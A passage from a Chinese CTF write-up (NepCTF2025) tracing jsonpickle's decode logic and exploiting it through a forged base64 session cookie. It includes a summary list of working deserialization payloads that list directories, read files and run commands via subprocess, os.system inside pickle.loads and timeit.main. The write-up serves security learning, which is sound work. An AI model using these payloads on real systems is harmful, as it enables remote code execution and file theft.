language_">self</span>.safe:</span><br><span class="line">                restore = <span class="variable language_">self</span>._restore_repr_safe</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                restore = <span class="variable language_">self</span>._restore_repr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_dict  <span class="comment"># type: ignore[assignment]</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span>(obj) <span class="keyword">is</span> <span class="built_in">list</span>:</span><br><span class="line">        restore = <span class="variable language_">self</span>._restore_list  <span class="comment"># type: ignore[assignment]</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        restore = _passthrough  <span class="comment"># type: ignore[assignment]</span></span><br><span class="line">    <span class="keyword">return</span> restore</span><br></pre></td></tr></table></figure>

<p>这里的话就是重要逻辑了， 根据标签去恢复对象，可以看到当对象为字典的时候逻辑还是蛮多的。我们找几个有意思的看一下</p>
<h3 id="py-object"><a href="#py-object" class="headerlink" title="py&#x2F;object"></a>py&#x2F;object</h3><p>先看看处理逻辑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_restore_object</span>(<span class="params">self, obj: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Any</span>]</span>) -&gt; <span class="type">Any</span>:</span><br><span class="line">    class_name = obj[tags.OBJECT]</span><br><span class="line">    cls = loadclass(class_name, classes=<span class="variable language_">self</span>._classes)</span><br><span class="line">    handler = handlers.get(cls, handlers.get(class_name))  <span class="comment"># type: ignore[arg-<span class="built_in">type</span>]</span></span><br><span class="line">    <span class="keyword">if</span> handler <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:  <span class="comment"># custom handler</span></span><br><span class="line">        proxy = _Proxy()</span><br><span class="line">        <span class="variable language_">self</span>._mkref(proxy)</span><br><span class="line">        instance = handler(<span class="variable language_">self</span>).restore(obj)</span><br><span class="line">        proxy.reset(instance)</span><br><span class="line">        <span class="variable language_">self</span>._swapref(proxy, instance)</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> cls <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._process_missing(class_name)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._mkref(obj)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>._restore_object_instance(obj, cls, class_name)  <span class="comment"># type: ignore[arg-<span class="built_in">type</span>]</span></span><br></pre></td></tr></table></figure>

<p>先是从处理对象中提取出py&#x2F;object键的值作为class_name类名，我们跟进看一下这个loadclass方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">loadclass</span>(<span class="params"></span></span><br><span class="line"><span class="params">    module_and_name: <span class="built_in">str</span>, classes: <span class="type">Optional</span>[<span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">Type</span>[<span class="type">Any</span>]]] = <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Optional</span>[<span class="type">Union</span>[<span class="type">Type</span>[<span class="type">Any</span>], ModuleType]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Loads the module and returns the class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; cls = loadclass(&#x27;datetime.datetime&#x27;)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; cls.__name__</span></span><br><span class="line"><span class="string">    &#x27;datetime&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; loadclass(&#x27;does.not.exist&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; loadclass(&#x27;builtins.int&#x27;)()</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Check if the class exists in a caller-provided scope</span></span><br><span class="line">    <span class="keyword">if</span> classes:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> classes[module_and_name]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="comment"># maybe they didn&#x27;t provide a fully qualified path</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> classes[module_and_name.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[-<span class="number">1</span>]]</span><br><span class="line">            <span class="keyword">except</span> KeyError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="comment"># Otherwise, load classes from globally-accessible imports</span></span><br><span class="line">    names = module_and_name.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    <span class="comment"># First assume that everything up to the last dot is the module name,</span></span><br><span class="line">    <span class="comment"># then try other splits to handle classes that are defined within</span></span><br><span class="line">    <span class="comment"># classes</span></span><br><span class="line">    <span class="keyword">for</span> up_to <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(names) - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        module = util.untranslate_module_name(<span class="string">&#x27;.&#x27;</span>.join(names[:up_to]))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">__import__</span>(module)</span><br><span class="line">            obj = sys.modules[module]</span><br><span class="line">            <span class="keyword">for</span> class_name <span class="keyword">in</span> names[up_to:]:</span><br><span class="line">                obj = <span class="built_in">getattr</span>(obj, class_name)</span><br><span class="line">            <span class="keyword">return</span> obj</span><br><span class="line">        <span class="keyword">except</span> (AttributeError, ImportError, ValueError):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># NoneType is a special case and can not be imported/created</span></span><br><span class="line">    <span class="keyword">if</span> module_and_name == <span class="string">&quot;builtins.NoneType&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>其实就是一个加载指定模块中类的一个方法，先是检查classes字典是否存在，存在则把里面的str键对应的值返回，如果没找到的话就会分离出最后一部分类名并再次查找。例如，<code>&#39;datetime.datetime&#39;</code> 会先查找 <code>&#39;datetime.datetime&#39;</code>，如果找不到，再尝试查找 <code>&#39;datetime&#39;</code>。如果两者都没有找到，则跳过这部分逻辑。</p>
<p>如果classes字典并不存在的话，就会通过从系统中动态加载模块去获取类，这里的话就没必要说了</p>
<p>其实这里的话就是一个获取模块中类的过程，跟进一下return中的函数</p>
<p>重点看几个逻辑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> has_tag(obj, tags.NEWARGSEX):</span><br><span class="line">            args, kwargs = obj[tags.NEWARGSEX]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            args = getargs(obj, classes=<span class="variable language_">self</span>._classes)</span><br><span class="line">            kwargs = &#123;&#125;</span><br><span class="line">        <span class="keyword">if</span> args:</span><br><span class="line">            args = <span class="variable language_">self</span>._restore(args)</span><br><span class="line">        <span class="keyword">if</span> kwargs:</span><br><span class="line">            kwargs = <span class="variable language_">self</span>._restore(kwargs)</span><br></pre></td></tr></table></figure>

<p>如果obj字典中包含tags.NEWARGSEX标签，就会从该标签中获取<code>args</code> 和 <code>kwargs</code>，这两个变量分别表示的是位置参数和关键字参数</p>
<p>如果没有这个标签的话会调用getargs方法去获取参数，并设置关键字参数为空</p>
<p>如果这两个变量存在，就会调用_restore去反序列化，恢复它们的原始数据结构。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_oldstyle <span class="keyword">and</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;__new__&#x27;</span>):</span><br><span class="line">        <span class="comment"># new style classes</span></span><br><span class="line">        <span class="keyword">if</span> factory:</span><br><span class="line">            instance = cls.__new__(cls, factory, *args, **kwargs)</span><br><span class="line">            instance.default_factory = factory</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            instance = cls.__new__(cls, *args, **kwargs)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        instance = <span class="built_in">object</span>.__new__(cls)</span><br><span class="line"><span class="keyword">except</span> TypeError:  <span class="comment"># old-style classes</span></span><br><span class="line">    is_oldstyle = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>如果是新式类且该类定义了 <code>__new__</code> 方法，使用 <code>cls.__new__</code> 来实例化对象。如果有工厂方法，则将工厂方法作为参数传递给 <code>__new__</code>。</p>
<p>如果不是新式类的话就自动实例一个空对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> is_oldstyle:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        instance = cls(*args)</span><br><span class="line">    <span class="keyword">except</span> TypeError:  <span class="comment"># fail gracefully</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            instance = make_blank_classic(cls)</span><br><span class="line">        <span class="keyword">except</span> Exception:  <span class="comment"># fail gracefully</span></span><br><span class="line">            <span class="variable language_">self</span>._process_missing(class_name)</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>._mkref(obj)</span><br></pre></td></tr></table></figure>

<p>如果是旧式类，就直接利用<code>cls(*args)</code>调用构造函数，并且这里会触发<code>__init__</code>方法</p>
<p>这里的话还会恢复实例中的变量，也就是从obj中提取数据并赋值给实例的各个属性变量</p>
<p>最终返回恢复出来的实例。</p>
<p>我们写个demo测试一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;glob.glob&quot;</span>,</span><br><span class="line">    <span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;/&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">data = json.dumps(payload)</span><br><span class="line">raw = jsonpickle.decode(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/NepCTF2025/image-20250730160910265.png" alt="image-20250730160910265"></p>
<p>在<code>_restore_object</code>中打断点进入</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804105304724.png" alt="image-20250804105304724"></p>
<p>可以看到在执行了loadclass之后成功找到glob方法并赋值给cls，步入return语句，这里的话会先判断是否有newargsex标签，我们这里没用上，所以到else中获取到arg的值，随后进入_restore方法</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804110503048.png" alt="image-20250804110503048"></p>
<p>这里的话就是再次调用<code>_restore_tags</code>去获取args了，因为这里的话args是一个列表，所以会进入最后一个list的语句调用<code>_restore_list</code></p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804111243251.png" alt="image-20250804111243251"></p>
<p>往后走，最终的话就是会调用<code>glob,glob(&quot;/*&quot;)</code></p>
<p>不小心把代码写错了，应该是这样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;glob.glob&quot;</span>,</span><br><span class="line">    <span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;/*&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">data = json.dumps(payload)</span><br><span class="line">raw = jsonpickle.decode(data)</span><br><span class="line"><span class="built_in">print</span>(raw)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后我们具体看一下那两个参数标签</p>
<h3 id="py-newargs和py-newargsex"><a href="#py-newargs和py-newargsex" class="headerlink" title="py&#x2F;newargs和py&#x2F;newargsex"></a>py&#x2F;newargs和py&#x2F;newargsex</h3><img src="../image/achieve/202411/NepCTF2025/image-20250804112907139.png" alt="image-20250804112907139" style="zoom:150%;" />

<p>py&#x2F;newargsex反序列化处理逻辑</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804113004421.png" alt="image-20250804113004421"></p>
<p>py&#x2F;newargs反序列化处理逻辑</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804113200615.png" alt="image-20250804113200615"></p>
<p>把刚刚的代码换成py&#x2F;newargsex跑一下</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804114414571.png" alt="image-20250804114414571"></p>
<p>出现了一个报错，其实就是因为我们传入的内容格式不正确导致的，由于<code>py/newargsex</code> 的值应该是一个包含两个元素的列表：<code>[args, kwargs]</code>，所以需要改成</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;glob.glob&quot;</span>,</span><br><span class="line">    <span class="string">&quot;py/newargsex&quot;</span> : [[<span class="string">&quot;/*&quot;</span>], &#123;&#125;]</span><br><span class="line">&#125;</span><br><span class="line">data = json.dumps(payload)</span><br><span class="line">raw = jsonpickle.decode(data)</span><br><span class="line"><span class="built_in">print</span>(raw)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="payload总结"><a href="#payload总结" class="headerlink" title="payload总结"></a>payload总结</h3><ul>
<li>读目录</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">glob.glob函数</span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;glob.glob&quot;</span>, <span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;/*&quot;</span>]&#125;</span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;glob.glob&quot;</span>, <span class="string">&quot;py/newargsex&quot;</span> : [[<span class="string">&quot;/*&quot;</span>], &#123;&#125;]&#125;</span><br><span class="line"> </span><br><span class="line">os.listdir函数</span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;os.listdir&quot;</span>,<span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;/&quot;</span>]&#125;</span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;os.listdir&quot;</span>,<span class="string">&quot;py/newargsex&quot;</span> : [[<span class="string">&quot;/&quot;</span>], &#123;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>读文件</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linecache.getlines函数</span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;subprocess.getoutput&quot;</span>,<span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;calc&quot;</span>]&#125;</span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;linecache.getlines&quot;</span>,<span class="string">&quot;py/newargsex&quot;</span> : [[<span class="string">&quot;test.py&quot;</span>], &#123;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>RCE</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;subprocess.run&quot;</span>,<span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;calc&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;subprocess.getoutput&quot;</span>,<span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;calc&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;pickle.loads&quot;</span>, <span class="string">&quot;py/newargs&quot;</span>: [&#123;<span class="string">&quot;py/b64&quot;</span>:<span class="string">&quot;KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJjYWxjIicKby4=&quot;</span>&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;timeit.main&quot;</span>, <span class="string">&quot;py/newargs&quot;</span>: [[<span class="string">&quot;-r&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;-n&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;calc&#x27;)&quot;</span>]]&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;py/object&quot;</span>: <span class="string">&#x27;uuid._get_command_stdout&#x27;</span>, <span class="string">&#x27;py/newargs&#x27;</span>: [<span class="string">&#x27;calc&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;py/object&#x27;</span>: <span class="string">&#x27;pydoc.pipepager&#x27;</span>, <span class="string">&#x27;py/newargs&#x27;</span>: [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;calc&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们可以试一下</p>
<h2 id="初次尝试"><a href="#初次尝试" class="headerlink" title="初次尝试"></a>初次尝试</h2><p>在尝试之前，我们需要注意一个点，就是关于回显位的问题，我们如何将反序列化后的执行结果返回到页面中进行渲染？</p>
<p>先把之前的cookie拿过来看一下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;py/object&quot;: &quot;__main__.Session&quot;, &quot;meta&quot;: &#123;&quot;user&quot;: &quot;1111&quot;, &quot;ts&quot;: 1754290309&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>再结合&#x2F;panel路由的页面</p>
<img src="../image/achieve/202411/NepCTF2025/image-20250804145550776.png" alt="image-20250804145550776" style="zoom:150%;" />

<p>不难看出，user中的内容就是会回显到页面中，那我们不妨把poc翻到user的值中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;__main__.Session&quot;</span>,</span><br><span class="line">    <span class="string">&quot;meta&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: &#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;glob.glob&quot;</span>, <span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;/*&quot;</span>]&#125;,</span><br><span class="line">        <span class="string">&quot;ts&quot;</span>: <span class="built_in">int</span>(time.time()),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">json_payload = json.dumps(payload)</span><br><span class="line">data = base64.b64encode(json_payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/NepCTF2025/image-20250804145721516.png" alt="image-20250804145721516"></p>
<p>成功回显了根目录下的文件，证明我们的思路是正确的</p>
<p>有一个flag和readflag文件，先尝试读一下flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;py/object&quot;</span>: <span class="string">&quot;__main__.Session&quot;</span>,</span><br><span class="line">    <span class="string">&quot;meta&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;user&quot;</span>: &#123;<span class="string">&quot;py/object&quot;</span> : <span class="string">&quot;linecache.getlines&quot;</span>,<span class="string">&quot;py/newargs&quot;</span> : [<span class="string">&quot;/flag&quot;</span>]&#125;,</span><br><span class="line">        <span class="string">&quot;ts&quot;</span>: <span class="built_in">int</span>(time.time()),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是没有返回内容，估计是有权限，那么就想到需要RCE去执行readflag了</p>
<h2 id="厚积薄发"><a href="#厚积薄发" class="headerlink" title="厚积薄发"></a>厚积薄发</h2><p>先读一下源码&#x2F;app&#x2F;app.py，拿到后有点乱，丢给ai处理一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response, render_template, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> jsonpickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Account</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, uid, pwd</span>):</span><br><span class="line">        <span class="variable language_">self</span>.uid = uid</span><br><span class="line">        <span class="variable language_">self</span>.pwd = pwd</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Session</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, meta</span>):</span><br><span class="line">        <span class="variable language_">self</span>.meta = meta</span><br><span class="line"></span><br><span class="line">users_db = [</span><br><span class="line">    Account(<span class="string">&quot;admin&quot;</span>, os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>()),</span><br><span class="line">    Account(<span class="string">&quot;guest&quot;</span>, <span class="string">&quot;guest&quot;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register_user</span>(<span class="params">username, password</span>):</span><br><span class="line">    <span class="keyword">for</span> acc <span class="keyword">in</span> users_db:</span><br><span class="line">        <span class="keyword">if</span> acc.uid == username:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    users_db.append(Account(username, password))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">FORBIDDEN = [</span><br><span class="line">    <span 